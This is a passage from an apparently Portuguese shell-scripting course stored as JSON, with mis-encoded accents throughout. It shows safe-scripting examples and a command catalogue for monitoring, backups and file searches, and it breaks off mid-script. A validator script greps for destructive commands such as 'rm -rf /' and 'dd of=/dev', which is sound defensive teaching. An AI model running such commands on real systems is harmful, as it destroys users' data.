**Implemente logging** - Para debugging e auditoria\n4. **Configure traps de limpeza** - Garanta libera√ß√£o de recursos\n5. **Evite comandos perigosos** - Use alternativas seguras\n6. **Teste em ambiente isolado** - Antes de executar em produ√ß√£o\n7. **Documente suposi√ß√µes** - Comente o c√≥digo claramente\n8. **Mantenha scripts simples** - Complexidade √© inimiga da seguran√ßa\n9. **Revise permiss√µes** - Princ√≠pio do menor privil√©gio\n10. **Monitore execu√ß√µes** - Alerte sobre comportamentos anormais",
    "examples": "```bash\n# Exemplo 1: Validador de scripts\n#!/bin/bash\n# validador_script.sh\n\nscript=\"$1\"\n\necho \"Validando script: $script\"\necho \"======================\"\n\n# 1. Sintaxe Bash\nif bash -n \"$script\"; then\n    echo \"‚úÖ Sintaxe Bash OK\"\nelse\n    echo \"‚ùå Erro de sintaxe Bash\"\n    exit 1\nfi\n\n# 2. ShellCheck online\nif command -v shellcheck >/dev/null; then\n    echo \"\nExecutando ShellCheck...\"\n    shellcheck \"$script\"\nelse\n    echo \"‚ö†Ô∏è  ShellCheck n√£o instalado. Instale com:\"\n    echo \"   sudo apt install shellcheck  # Debian/Ubuntu\"\n    echo \"   sudo yum install shellcheck  # RHEL/CentOS\"\nfi\n\n# 3. Verificar shebang\necho \"\nVerificando shebang...\"\nshebang=$(head -1 \"$script\")\nif [[ \"$shebang\" =~ ^#!/bin/(bash|sh) ]]; then\n    echo \"‚úÖ Shebang OK: $shebang\"\nelse\n    echo \"‚ö†Ô∏è  Shebang incomum: $shebang\"\nfi\n\n# 4. Verificar comandos perigosos\necho \"\nVerificando comandos perigosos...\"\nperigosos=0\nwhile read -r linha; do\n    if [[ \"$linha\" =~ rm\\ -rf\\ [/\\*] ]] && [[ ! \"$linha\" =~ ^# ]]; then\n        echo \"‚ùå Linha ${linha%%:*}: rm -rf / ou /*\"\n        ((perigosos++))\n    fi\n    if [[ \"$linha\" =~ chmod\\ -R\\ 777 ]] && [[ ! \"$linha\" =~ ^# ]]; then\n        echo \"‚ùå Linha ${linha%%:*}: chmod -R 777\"\n        ((perigosos++))\n    fi\ndone < <(grep -n -E \"rm -rf|chmod -R 777|dd.*of=/dev\" \"$script\")\n\nif [[ $perigosos -eq 0 ]]; then\n    echo \"‚úÖ Nenhum comando perigoso encontrado\"\nfi\n\necho \"\nValida√ß√£o conclu√≠da!\"\n\n# Exemplo 2: Wrapper seguro para comandos perigosos\n#!/bin/bash\n# rm_seguro.sh\n\nif [[ $# -eq 0 ]]; then\n    echo \"Uso: $0 [op√ß√µes] <arquivos>\" >&2\n    echo \"Op√ß√µes:\" >&2\n    echo \"  -d    Remover diret√≥rios recursivamente\" >&2\n    echo \"  -i    Modo interativo\" >&2\n    echo \"  -l    Mover para lixeira em vez de remover\" >&2\n    exit 1\nfi\n\n# Processar op√ß√µes\nrecursivo=false\ninterativo=false\nlixeira=false\n\nwhile getopts \"dil\" opt; do\n    case $opt in\n        d) recursivo=true ;;\n        i) interativo=true ;;\n        l) lixeira=true ;;\n        *) echo \"Op√ß√£o inv√°lida\" >&2; exit 1 ;;\n    esac\ndone\nshift $((OPTIND-1))\n\n# Validar arquivos\nfor arquivo in \"$@\"; do\n    if [[ ! -e \"$arquivo\" ]]; then\n        echo \"ERRO: Arquivo n√£o existe: $arquivo\" >&2\n        exit 1\n    fi\n    \n    # Prevenir remo√ß√£o de caminhos cr√≠ticos\n    if [[ \"$arquivo\" == \"/\" ]] || [[ \"$arquivo\" =~ ^/etc$ ]] || [[ \"$arquivo\" =~ ^/boot$ ]]; then\n        echo \"ERRO: N√£o √© permitido remover: $arquivo\" >&2\n        exit 1\n    fi\n    \n    # Confirmar se for diret√≥rio\n    if [[ -d \"$arquivo\" ]] && [[ \"$recursivo\" == false ]]; then\n        echo \"AVISO: $arquivo √© um diret√≥rio. Use -d para remover recursivamente\" >&2\n        continue\n    fi\n    \n    # Modo interativo\n    if [[ \"$interativo\" == true ]]; then\n        read -p \"Remover $arquivo? [s/N]: \" resposta\n        if [[ ! \"$resposta\" =~ ^[Ss]$ ]]; then\n            continue\n        fi\n    fi\n    \n    # Executar remo√ß√£o\n    if [[ \"$lixeira\" == true ]]; then\n        # Mover para lixeira\n        lixeira_dir=\"$HOME/.lixeira\"\n        mkdir -p \"$lixeira_dir\"\n        mv \"$arquivo\" \"$lixeira_dir/\"\n        echo \"Movido para lixeira: $arquivo\"\n    elif [[ \"$recursivo\" == true ]] && [[ -d \"$arquivo\" ]]; then\n        rm -rf \"$arquivo\"\n        echo \"Removido (recursivo): $arquivo\"\n    else\n        rm -f \"$arquivo\"\n        echo \"Removido: $arquivo\"\n    fi\ndone\n\necho \"Opera√ß√£o conclu√≠da.\"\n\n# Exemplo 3: Monitor de integridade de arquivos\n#!/bin/bash\n# monitor_integridade.sh\n\nBASE_DIR=\"/\"\nLOG_FILE=\"/var/log/integridade.log\"\nHASH_FILE=\"/etc/file_hashes.txt\"\n\n# Gerar hashes se n√£o existir\nif [[ ! -f \"$HASH_FILE\" ]]; then\n    echo \"Gerando hashes iniciais...\"\n    find \"$BASE_DIR\" -type f -exec sha256sum {} \\; > \"$HASH_FILE\" 2>/dev/null\n    echo \"Hashes salvos em $HASH_FILE\"\n    exit 0\nfi\n\necho \"Verificando integridade de arquivos...\"\necho \"=====================================\"\n\n# Verificar hashes\nwhile read -r hash_esperado arquivo; do\n    if [[ -f \"$arquivo\" ]]; then\n        hash_atual=$(sha256sum \"$arquivo\" 2>/dev/null | awk '{print $1}')\n        \n        if [[ \"$hash_atual\" != \"$hash_esperado\" ]]; then\n            echo \"‚ö†Ô∏è  ALTERA√á√ÉO DETECTADA: $arquivo\" | tee -a \"$LOG_FILE\"\n            echo \"   Esperado: $hash_esperado\" | tee -a \"$LOG_FILE\"\n            echo \"   Atual:    $hash_atual\" | tee -a \"$LOG_FILE\"\n            echo \"\" | tee -a \"$LOG_FILE\"\n        fi\n    else\n        echo \"‚ùå ARQUIVO REMOVIDO: $arquivo\" | tee -a \"$LOG_FILE\"\n    fi\ndone < \"$HASH_FILE\"\n\necho \"Verifica√ß√£o conclu√≠da. Log salvo em $LOG_FILE\"\n```",
    "summary": "Neste m√≥dulo voc√™ aprendeu as pr√°ticas essenciais de seguran√ßa e otimiza√ß√£o para trabalhar no terminal e desenvolver scripts Shell. Conheceu os comandos mais perigosos e como evit√°-los, implementou t√©cnicas de valida√ß√£o de entrada, tratamento de erros, logging e limpeza de recursos. Aprendeu a criar scripts robustos com `set -euo pipefail`, fun√ß√µes de limpeza com `trap`, e monitoramento de seguran√ßa. Tamb√©m viu t√©cnicas de otimiza√ß√£o para melhorar performance e efici√™ncia. Agora voc√™ est√° preparado para desenvolver scripts profissionais que s√£o seguros, eficientes e confi√°veis.",
    "estimated_time_minutes": "90"
  },
  {
    "id": "module_problems",
    "course_id": "shell_script_completo",
    "title": "Cat√°logo por Problema e Recursos",
    "order": "8",
    "description": "Refer√™ncia pr√°tica organizada por problemas comuns e solu√ß√µes r√°pidas. √çndice completo de comandos e exemplos prontos para uso imediato no dia a dia do administrador de sistemas.",
    "learning_objectives": [
      "Localizar rapidamente solu√ß√µes para problemas espec√≠ficos",
      "Dominar comandos essenciais por categoria de uso",
      "Aplicar exemplos prontos em situa√ß√µes do mundo real",
      "Construir scripts complexos a partir de exemplos b√°sicos",
      "Utilizar refer√™ncias e recursos para aprendizado cont√≠nuo",
      "Implementar sistemas completos de monitoramento e backup"
    ],
    "key_concepts": [
      "Solu√ß√£o por problema",
      "Refer√™ncia de comandos",
      "Exemplos pr√°ticos",
      "Scripts reutiliz√°veis",
      "Recursos de aprendizado",
      "Ferramentas de diagn√≥stico",
      "Automa√ß√£o de tarefas"
    ],
    "content": "## üîç CAT√ÅLOGO POR PROBLEMA E RECURSOS\n\n### üîç \"Como monitorar...\"\n\n#### **Mem√≥ria:**\n```bash\n# Vis√£o geral r√°pida\n$ free -h\n\n# Monitoramento cont√≠nuo\n$ watch -n 2 free -h\n\n# Detalhes avan√ßados\n$ vmstat 1 5  # Estat√≠sticas a cada 1s, 5 vezes\n\n# Por processo\n$ ps aux --sort=-%mem | head -10\n\n# Cache e buffers\n$ cat /proc/meminfo | grep -E \"^(MemTotal|MemFree|Cached|Buffers)\"\n\n# Swap\n$ swapon --show\n$ cat /proc/swaps\n```\n\n#### **CPU:**\n```bash\n# Tempo real\n$ top\n$ htop  # Mais amig√°vel\n\n# Estat√≠sticas\n$ mpstat 1 3  # Por n√∫cleo, 1s intervalo, 3 vezes\n\n# Load average\n$ uptime\n$ cat /proc/loadavg\n\n# Por processo\n$ ps aux --sort=-%cpu | head -10\n\n# Temperatura\n$ sensors  # Se dispon√≠vel\n$ cat /sys/class/thermal/thermal_zone*/temp 2>/dev/null\n\n# Uso hist√≥rico\n$ sar -u 1 3  # Coletar dados de CPU\n```\n\n#### **Disco:**\n```bash\n# Espa√ßo livre\n$ df -h\n\n# Uso por diret√≥rio\n$ du -sh /* 2>/dev/null | sort -h\n\n# Top 10 maiores diret√≥rios\n$ du -h / | sort -rh | head -10\n\n# I/O em tempo real\n$ iotop  # Precisa instalar\n$ iostat 1 3\n\n# Velocidade de disco\n$ hdparm -Tt /dev/sda  # Teste de velocidade\n\n# SMART status\n$ sudo smartctl -a /dev/sda  # Sa√∫de do disco\n\n# Inodes\n$ df -i  # Espa√ßo de inodes\n```\n\n#### **Rede:**\n```bash\n# Interfaces\n$ ip addr show\n$ ip -br addr show  # Resumido\n\n# Conex√µes\n$ ss -tulpn  # Todas conex√µes\n$ netstat -tulpn  # Alternativa\n\n# Estat√≠sticas\n$ ip -s link  # Estat√≠sticas por interface\n$ netstat -s  # Estat√≠sticas gerais\n\n# Monitoramento em tempo real\n$ iftop  # Tr√°fego por conex√£o\n$ nethogs  # Tr√°fego por processo\n\n# Lat√™ncia\n$ ping -c 4 google.com\n$ mtr google.com  # Combina√ß√£o de ping+traceroute\n\n# Velocidade\n$ speedtest-cli  # Teste de velocidade internet\n\n# DNS\n$ dig google.com\n$ nslookup google.com\n```\n\n#### **Processos:**\n```bash\n# Todos processos\n$ ps aux\n\n# √Årvore de processos\n$ pstree\n\n# Por usu√°rio\n$ ps -u usuario\n\n# Por nome\n$ pgrep -l nginx\n$ ps aux | grep nginx\n\n# Recursos por processo\n$ top -p $(pgrep nginx)  # Monitorar processo espec√≠fico\n\n# Threads\n$ ps -eLf | grep processo\n$ top -H -p $(pgrep processo)\n\n# Ordenar por recursos\n$ ps aux --sort=-%cpu | head -5\n$ ps aux --sort=-%mem | head -5\n$ ps aux --sort=-%cpu --sort=-%mem | head -5\n```\n\n### üóúÔ∏è \"Como compactar...\"\n\n#### **.tar.gz (mais comum no Linux):**\n```bash\n# Compactar diret√≥rio\n$ tar -czf arquivo.tar.gz diretorio/\n\n# Compactar m√∫ltiplos arquivos/diret√≥rios\n$ tar -czf backup.tar.gz dir1/ dir2/ arquivo1.txt\n\n# Compactar preservando permiss√µes\n$ tar -czpf arquivo.tar.gz diretorio/\n\n# Listar conte√∫do sem extrair\n$ tar -tzf arquivo.tar.gz\n\n# Extrair\n$ tar -xzf arquivo.tar.gz\n\n# Extrair para diret√≥rio espec√≠fico\n$ tar -xzf arquivo.tar.gz -C /caminho/destino\n\n# Extrair arquivo espec√≠fico\n$ tar -xzf arquivo.tar.gz caminho/para/arquivo\n\n# Criar tar primeiro, depois gzip\n$ tar -cf arquivo.tar diretorio/\n$ gzip arquivo.tar\n```\n\n#### **.zip (universal):**\n```bash\n# Compactar diret√≥rio recursivamente\n$ zip -r arquivo.zip diretorio/\n\n# Compactar m√∫ltiplos arquivos\n$ zip arquivo.zip file1.txt file2.txt\n\n# Compactar com senha\n$ zip -e arquivo.zip diretorio/  # Pedir√° senha\n\n# Compactar com n√≠vel de compress√£o (0-9)\n$ zip -9 -r arquivo.zip diretorio/  # M√°xima compress√£o\n\n# Listar conte√∫do\n$ unzip -l arquivo.zip\n\n# Extrair\n$ unzip arquivo.zip\n\n# Extrair para diret√≥rio espec√≠fico\n$ unzip arquivo.zip -d /caminho/destino\n\n# Extrair arquivo espec√≠fico\n$ unzip arquivo.zip caminho/arquivo.txt\n\n# Testar integridade\n$ unzip -t arquivo.zip\n```\n\n#### **.7z (alta compress√£o):**\n```bash\n# Compactar (se 7z estiver instalado)\n$ 7z a arquivo.7z diretorio/\n\n# Compactar com senha\n$ 7z a -p\"senha\" arquivo.7z diretorio/\n\n# Listar\n$ 7z l arquivo.7z\n\n# Extrair\n$ 7z x arquivo.7z\n\n# Extrair para diret√≥rio\n$ 7z x arquivo.7z -o/caminho/destino\n```\n\n#### **.rar:**\n```bash\n# Compactar\n$ rar a arquivo.rar diretorio/\n\n# Compactar com divis√£o (ex: partes de 100MB)\n$ rar a -v100m arquivo.rar diretorio/\n\n# Adicionar senha\n$ rar a -p\"senha\" arquivo.rar diretorio/\n\n# Extrair\n$ unrar x arquivo.rar\n\n# Listar\n$ unrar l arquivo.rar\n```\n\n#### **Compara√ß√£o de formatos:**\n```bash\n# Tamanhos comparativos\n$ ls -lh arquivo.*\n# .tar.gz - Bom equil√≠brio, amplamente suportado\n# .zip    - Universal, r√°pido\n# .7z     - Melhor compress√£o, mais lento\n# .rar    - Boa compress√£o, propriet√°rio\n```\n\n### üîé \"Como encontrar...\"\n\n#### **Arquivo por nome:**\n```bash\n# Busca completa (pode ser lenta)\n$ find / -name \"arquivo.txt\" 2>/dev/null\n\n# Busca case-insensitive\n$ find / -iname \"arquivo.txt\" 2>/dev/null\n\n# Busca por padr√£o\n$ find / -name \"*.log\" 2>/dev/null\n$ find / -name \"backup_*.tar.gz\" 2>/dev/null\n\n# Busca r√°pida (usa banco de dados)\n$ locate arquivo.txt\n$ locate -i arquivo.txt  # Case-insensitive\n\n# Atualizar banco do locate\n$ sudo updatedb\n\n# Busca por caminho aproximado\n$ find /home -path \"*/projeto/*.py\"\n```\n\n#### **Texto em arquivos:**\n```bash\n# Busca recursiva\n$ grep -r \"texto\" diretorio/\n\n# Case-insensitive\n$ grep -ri \"texto\" diretorio/\n\n# Mostrar n√∫mero da linha\n$ grep -rn \"texto\" diretorio/\n\n# Buscar m√∫ltiplos padr√µes\n$ grep -r -e \"erro\" -e \"warning\" -e \"fatal\" logs/\n\n# Express√µes regulares\n$ grep -rE \"[0-9]{3}-[0-9]{2}-[0-9]{4}\" documentos/  # SSN\n\n# Arquivos que cont√™m o texto\n$ grep -rl \"texto\" diretorio/\n\n# Contar ocorr√™ncias\n$ grep -rc \"texto\" diretorio/\n\n# Contexto ao redor\n$ grep -r -B2 -A2 \"texto\" arquivo.log  # 2 linhas antes/depois\n```\n\n#### **Arquivos grandes:**\n```bash\n# Maiores que 100MB\n$ find / -type f -size +100M 2>/dev/null\n\n# Entre 1MB e 10MB\n$ find / -type f -size +1M -size -10M 2>/dev/null\n\n# Top 10 maiores arquivos\n$ find / -type f -exec du -h {} + 2>/dev/null | sort -rh | head -10\n\n# Top 10 maiores diret√≥rios\n$ du -h / | sort -rh | head -10\n\n# Analisar uso por tipo\n$ find /home -type f -name \"*.mp4\" -exec du -ch {} + | tail -1\n$ find /home -type f -name \"*.iso\" -exec du -ch {} + | tail -1\n```\n\n#### **Arquivos modificados recentemente:**\n```bash\n# √öltimas 24 horas\n$ find . -type f -mtime -1\n\n# √öltimas 2 horas\n$ find . -type f -mmin -120\n\n# Hoje\n$ find . -type f -mtime 0\n\n# Entre 7 e 14 dias atr√°s\n$ find . -type f -mtime +7 -mtime -14\n\n# Modificados mais recentemente que outro arquivo\n$ find . -type f -newer referencia.txt\n\n# Ordenar por data\n$ find . -type f -exec ls -lt {} + | head -10\n```\n\n#### **Arquivos por tipo/permiss√µes:**\n```bash\n# Arquivos execut√°veis\n$ find . -type f -executable\n\n# Arquivos com SUID\n$ find / -type f -perm /4000 2>/dev/null\n\n# Arquivos com SGID\n$ find / -type f -perm /2000 2>/dev/null\n\n# Arquivos com permiss√£o de escrita para outros\n$ find / -type f -perm /o=w 2>/dev/null\n\n# Arquivos de um usu√°rio\n$ find /home -user usuario\n\n# Arquivos de um grupo\n$ find /home -group desenvolvedores\n\n# Arquivos vazios\n$ find . -type f -empty\n\n# Links simb√≥licos quebrados\n$ find -L . -type l 2>/dev/null\n```\n\n### üíæ \"Como fazer backup...\"\n\n#### **C√≥pia simples:**\n```bash\n# Copiar arquivos\n$ cp -r origem/ destino/\n\n# Copiar preservando tudo\n$ cp -a origem/ destino/  # -a = archive (preserva tudo)\n\n# Copiar com verifica√ß√£o\n$ cp -v origem/ destino/  # Verboso\n$ cp -i origem/ destino/  # Interativo\n\n# Copiar apenas se origem mais nova\n$ cp -u origem/ destino/  # Update\n```\n\n#### **Sincroniza√ß√£o com rsync:**\n```bash\n# Sincronizar diret√≥rios\n$ rsync -av origem/ destino/\n# -a: archive mode (preserva tudo)\n# -v: verbose\n\n# Sincronizar com exclus√µes\n$ rsync -av --exclude='*.tmp' --exclude='temp/' origem/ destino/\n\n# Sincronizar com limite de banda\n$ rsync -av --bwlimit=1000 origem/ destino/  # 1000 KB/s\n\n# Sincronizar com compress√£o\n$ rsync -avz origem/ destino/  # -z: compress during transfer\n\n# Sincronizar com progresso\n$ rsync -av --progress origem/ destino/\n\n# Sincronizar via SSH\n$ rsync -avz -e ssh origem/ usuario@servidor:destino/\n\n# Sincronizar e deletar no destino\n$ rsync -av --delete origem/ destino/  # Cuidado!\n\n# Backup incremental com hardlinks\n$ rsync -av --link-dest=../backup_anterior origem/ backup_atual/\n\n# Dry run (testar sem fazer)\n$ rsync -avn origem/ destino/  # -n: dry run\n```\n\n#### **Backup com data:**\n```bash\n# Backup di√°rio\n$ tar -czf backup_$(date +%Y%m%d).tar.gz diretorio/\n\n# Backup com timestamp\n$ tar -czf backup_$(date +%Y%m%d_%H%M%S).tar.gz diretorio/\n\n# Backup do m√™s\n$ tar -czf backup_$(date +%Y%m).tar.gz diretorio/\n\n# Backup semanal (segunda-feira)\nif [ $(date +%u) -eq 1 ]; then\n    tar -czf backup_semanal_$(date +%Y%m%d).tar.gz diretorio/\nfi\n\n# Backup rotativo (mant√©m √∫ltimos 7 dias)\n$ tar -czf backup_$(date +%Y%m%d).tar.gz diretorio/\n$ find /backup -name \"backup_*.tar.gz\" -mtime +7 -delete\n```\n\n#### **Backup de banco de dados:**\n```bash\n# MySQL\n$ mysqldump -u usuario -p banco > backup_$(date +%Y%m%d).sql\n\n# PostgreSQL\n$ pg_dump banco > backup_$(date +%Y%m%d).sql\n\n# MongoDB\n$ mongodump --out backup_$(date +%Y%m%d)\n\n# Redis\n$ redis-cli SAVE  # Cria dump.rdb\n$ cp /var/lib/redis/dump.rdb backup_redis_$(date +%Y%m%d).rdb\n```\n\n### üì¶ \"Como instalar...\"\n\n#### **Debian/Ubuntu (APT):**\n```bash\n# Atualizar reposit√≥rios\n$ sudo apt update\n\n# Instalar pacote\n$ sudo apt install nome_pacote\n\n# Instalar m√∫ltiplos\n$ sudo apt install pacote1 pacote2 pacote3\n\n# Instalar vers√£o espec√≠fica\n$ sudo apt install nome_pacote=1.2.3-1\n\n# Instalar sem prompts\n$ sudo apt install -y nome_pacote\n\n# Instalar recomendados tamb√©m\n$ sudo apt install --install-recommends nome_pacote\n\n# Instalar pacote .deb manual\n$ sudo dpkg -i pacote.deb\n$ sudo apt install -f  # Corrigir depend√™ncias\n\n# Instalar de PPA\n$ sudo add-apt-repository ppa:nome/ppa\n$ sudo apt update\n$ sudo apt install nome_pacote\n```\n\n#### **RHEL/CentOS (YUM):**\n```bash\n# Instalar\n$ sudo yum install nome_pacote\n\n# Instalar grupo\n$ sudo yum groupinstall \"Development Tools\"\n\n# Instalar de reposit√≥rio EPEL\n$ sudo yum install epel-release\n$ sudo yum install nome_pacote\n\n# Instalar local .rpm\n$ sudo rpm -i pacote.rpm\n\n# Instalar com depend√™ncias\n$ sudo yum localinstall pacote.rpm\n```\n\n#### **Fedora (DNF):**\n```bash\n# Instalar\n$ sudo dnf install nome_pacote\n\n# Instalar grupo\n$ sudo dnf groupinstall \"Development Tools\"\n\n# Instalar com melhor solucionador\n$ sudo dnf install --best nome_pacote\n\n# Hist√≥rico\n$ sudo dnf history\n```\n\n#### **Pacotes gen√©ricos:**\n```bash\n# .tar.gz (compilar)\n$ tar -xzf pacote.tar.gz\n$ cd pacote\n$ ./configure\n$ make\n$ sudo make install\n\n# Snap\n$ sudo snap install nome\n\n# Flatpak\n$ flatpak install nome\n\n# AppImage\n$ chmod +x aplicativo.AppImage\n$ ./aplicativo.AppImage\n```\n\n### üéØ \"Como matar processo...\"\n\n```bash\n# Por PID\n$ kill 1234\n$ kill -9 1234  # For√ßado\n\n# Por nome\n$ pkill firefox\n$ pkill -9 firefox  # For√ßado\n\n# Todos com nome\n$ killall firefox\n\n# Processos de usu√°rio\n$ pkill -u usuario\n$ killall -u usuario\n\n# Processos mais antigos que\n$ killall -o 2h firefox  # Mais velhos que 2 horas\n\n# Processos mais novos que\n$ killall -y 30m firefox  # Mais novos que 30 minutos\n\n# Por comando exato\n$ pkill -f \"/usr/bin/python3 script.py\"\n\n# Enviar sinal espec√≠fico\n$ kill -HUP 1234  # Reiniciar processo\n$ kill -TERM 1234  # T√©rmino gracioso (padr√£o)\n$ kill -KILL 1234  # For√ßado (equivalente a -9)\n$ kill -STOP 1234  # Pausar\n$ kill -CONT 1234  # Continuar pausado\n```\n\n### üìã √çNDICE COMPLETO DE COMANDOS\n\n| Comando | Categoria | Descri√ß√£o | Exemplo B√°sico |\n|---------|-----------|-----------|----------------|\n| **`alias`** | Shell | Cria apelidos para comandos | `alias ll='ls -la'` |\n| **`awk`** | Texto | Processamento de texto avan√ßado | `awk '{print $1}' arquivo` |\n| **`cat`** | Arquivos | Concatena e mostra arquivos | `cat arquivo.txt` |\n| **`cd`** | Navega√ß√£o | Muda diret√≥rio | `cd /home/usuario` |\n| **`chmod`** | Permiss√µes | Altera permiss√µes | `chmod 755 script.sh` |\n| **`chown`** | Permiss√µes | Altera dono/grupo | `chown usuario:grupo arquivo` |\n| **`cp`** | Arquivos | Copia arquivos/diret√≥rios | `cp origem destino` |\n| **`cron`** | Agendamento | Agenda tarefas | `crontab -e` |\n| **`curl`** | Rede | Transfere dados da web | `curl -O https://exemplo.com/arquivo` |\n| **`cut`** | Texto | Extrai colunas do texto | `cut -d',' -f1 arquivo.csv` |\n| **`date`** | Sistema | Mostra/ajusta data e hora | `date '+%Y-%m-%d'` |\n| **`df`** | Disco | Mostra espa√ßo em disco | `df -h` |\n| **`diff`** | Texto | Compara arquivos | `diff arquivo1 arquivo2` |\n| **`dig`** | Rede | Consultas DNS | `dig google.com` |\n| **`du`** | Disco | Uso de disco por diret√≥rio | `du -sh /home` |\n| **`echo`** | Shell | Imprime texto | `echo \"Hello World\"` |\n| **`find`** | Sistema | Encontra arquivos | `find . -name \"*.txt\"` |\n| **`free`** | Mem√≥ria | Mostra mem√≥ria livre | `free -h` |\n| **`grep`** | Texto | Busca padr√µes em texto | `grep \"erro\" log.txt` |\n| **`head`** | Texto | Mostra primeiras linhas | `head -10 arquivo.txt` |\n| **`history`** | Shell | Hist√≥rico de comandos | `history \\| grep apt` |\n| **`htop`** | Processos | Monitor de processos | `htop` |\n| **`ifconfig`** | Rede | Configura interfaces | `ifconfig eth0` |\n| **`ip`** | Rede | Gerencia rede | `ip addr show` |\n| **`jobs`** | Shell | Lista jobs em background | `jobs` |\n| **`kill`** | Processos | Mata processos | `kill 1234` |\n| **`less`** | Texto | Visualizador de texto | `less arquivo_grande.log` |\n| **`ln`** | Sistema | Cria links | `ln -s alvo link` |\n| **`ls`** | Navega√ß√£o | Lista arquivos | `ls -la` |\n| **`man`** | Ajuda | Manual de comandos | `man ls` |\n| **`mkdir`** | Arquivos | Cria diret√≥rios | `mkdir nova_pasta` |\n| **`mv`** | Arquivos | Move/renomeia | `mv antigo novo` |\n| **`nano`** | Editor | Editor de texto | `nano arquivo.txt` |\n| **`netstat`** | Rede | Estat√≠sticas de rede | `netstat -tulpn` |\n| **`passwd`** | Usu√°rios | Altera senha | `passwd` |\n| **`ping`** | Rede | Testa conectividade | `ping google.com` |\n| **`ps`** | Processos | Lista processos | `ps aux` |\n| **`pwd`** | Navega√ß√£o | Mostra diret√≥rio atual | `pwd` |\n| **`rm`** | Arquivos | Remove arquivos | `rm arquivo.txt` |\n| **`rmdir`** | Arquivos | Remove diret√≥rios vazios | `rmdir pasta_vazia` |\n| **`rsync`** | Backup | Sincroniza arquivos | `rsync -av origem/ destino/` |\n| **`scp`** | Rede | Copia via SSH | `scp arquivo usuario@host:/destino` |\n| **`sed`** | Texto | Editor de stream | `sed 's/antigo/novo/g' arquivo` |\n| **`ssh`** | Rede | Conex√£o remota | `ssh usuario@host` |\n| **`sudo`** | Permiss√µes | Executa como root | `sudo apt update` |\n| **`tail`** | Texto | Mostra √∫ltimas linhas | `tail -f log.txt` |\n| **`tar`** | Arquivos | Compacta/descompacta | `tar -czf arquivo.tar.gz pasta/` |\n| **`top`** | Processos | Monitor de processos | `top` |\n| **`touch`** | Arquivos | Cria arquivo vazio | `touch novo.txt` |\n| **`tr`** | Texto | Traduz/deleta caracteres | `tr 'a-z' 'A-Z' < arquivo` |\n| **`tree`** | Navega√ß√£o | Mostra √°rvore de diret√≥rios | `tree -L 2` |\n| **`uname`** | Sistema | Informa√ß√µes do sistema | `uname -a` |\n| **`uptime`** | Sistema | Tempo ligado | `uptime` |\n| **`vi/vim`** | Editor | Editor avan√ßado | `vim arquivo.txt` |\n| **`wc`** | Texto | Conta palavras/linhas | `wc -l arquivo.txt` |\n| **`wget`** | Rede | Download de arquivos | `wget https://exemplo.com/arquivo` |\n| **`which`** | Sistema | Localiza comando | `which python` |\n| **`whoami`** | Usu√°rios | Mostra usu√°rio atual | `whoami` |\n| **`xargs`** | Sistema | Constr√≥i comandos | `find . -name \"*.txt\" \\| xargs rm` |\n\n### üìù EXEMPLOS PR√ÅTICOS COMPLETOS\n\n#### **Exemplo 1: Sistema de Backup Completo**\n\n```bash\n#!/bin/bash\n# backup_sistema_completo.sh\n\nset -euo pipefail\n\n# Configura√ß√µes\nBACKUP_ROOT=\"/backup\"\nLOG_DIR=\"/var/log/backup\"\nRETENTION_DAYS=30\nEMAIL_ADMIN=\"admin@empresa.com\"\n\n# Criar estrutura de diret√≥rios\nmkdir -p \"$BACKUP_ROOT\" \"$LOG_DIR\"\n\n# Gerar timestamp\nTIMESTAMP=$(date +%Y%m%d_%H%M%S)\nLOG_FILE=\"$LOG_DIR/backup_$TIMESTAMP.log\"\n\n# Fun√ß√µes\nlog() {\n    local level=\"$1\"\n    local message=\"$2\"\n    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')\n    echo \"[$timestamp] [$level] $message\" | tee -a \"$LOG_FILE\"\n}\n\nsend_alert() {\n    local subject=\"$1\"\n    local body=\"$2\"\n    \n    if command -v mail >/dev/null 2>&1; then\n        echo -e \"$body\" | mail -s \"$subject\" \"$EMAIL_ADMIN\"\n    else\n        log \"WARNING\" \"Comando mail n√£o dispon√≠vel. Alerta: $subject\"\n    fi\n}\n\nbackup_directory() {\n    local source=\"$1\"\n    local name=\"$2\"\n    local backup_file=\"$BACKUP_ROOT/${name}_${TIMESTAMP}.tar.gz\"\n    \n    if [ ! -d \"$source\" ]; then\n        log \"WARNING\" \"Diret√≥rio n√£o existe: $source\"\n        return 1\n    fi\n    \n    log \"INFO\" \"Backup de: $source\"\n    \n    # Medir tempo\n    local start_time=$(date +%s)\n    \n    if tar -czf \"$backup_file\" -C \"$(dirname \"$source\")\" \"$(basename \"$source\")\" 2>/tmp/backup_error.$$; then\n        local end_time=$(date +%s)\n        local duration=$((end_time - start_time))\n        local size=$(du -h \"$backup_file\" | cut -f1)\n        \n        log \"SUCCESS\" \"Backup criado: $backup_file ($size, ${duration}s)\"\n        return 0\n    else\n        log \"ERROR\" \"Falha no backup de $source\"\n        cat /tmp/backup_error.$$ >> \"$LOG_FILE\"\n        rm -f \"$backup_file\"  # Remover backup incompleto\n        return 1\n    fi\n}\n\n# In√≠cio do backup\nlog \"INFO\" \"=== INICIANDO BACKUP DO SISTEMA ===\"\nlog \"INFO\" \"Timestamp: $TIMESTAMP\"\n\n# Lista de diret√≥rios para backup\nBACKUP_DIRS=(\n    \"/etc\"\n    \"/home\"\n    \"/var/www\"\n    \"/var/log\"\n    \"/root\"\n)\n\n# Estat√≠sticas\nTOTAL_SUCCESS=0\nTOTAL_FAILED=0\n\n# Executar backups\nfor dir in \"${BACKUP_DIRS[@]}\"; do\n    name=$(basename \"$dir\")\n    if backup_directory \"$dir\" \"$name\"; then\n        ((TOTAL_SUCCESS++))\n    else\n        ((TOTAL_FAILED++))\n    fi\ndone\n\n# Limpeza de backups antigos\nlog \"INFO\" \"Removendo backups com mais de ${RETENTION_DAYS} dias...\"\nOLD_BACKUPS=$(find \"$BACKUP_ROOT\" -name \"*.tar.gz\" -mtime +$RETENTION_DAYS | wc -l)\nfind \"$BACKUP_ROOT\" -name \"*.tar.gz\" -mtime +$RETENTION_DAYS -delete\nlog \"INFO\" \"Removidos $OLD_BACKUPS backups antigos\"\n\n# Verificar espa√ßo\ndisk_usage=$(df -h \"$BACKUP_ROOT\" | awk 'NR==2 {print $5}' | sed 's/%//')\nif [ \"$disk_usage\" -gt 90 ]; then\n    log \"WARNING\" \"Uso de disco em $disk_usage% - Limite pr√≥ximo\"\n    send_alert \"ALERTA: Espa√ßo em disco baixo\" \"Uso de disco em $BACKUP_ROOT: $disk_usage%\"\nfi\n\n# Resumo\nlog \"INFO\" \"=== RESUMO DO BACKUP ===\"\nlog \"INFO\" \"Backups bem-sucedidos: $TOTAL_SUCCESS\"\nlog \"INFO\" \"Backups com falha: 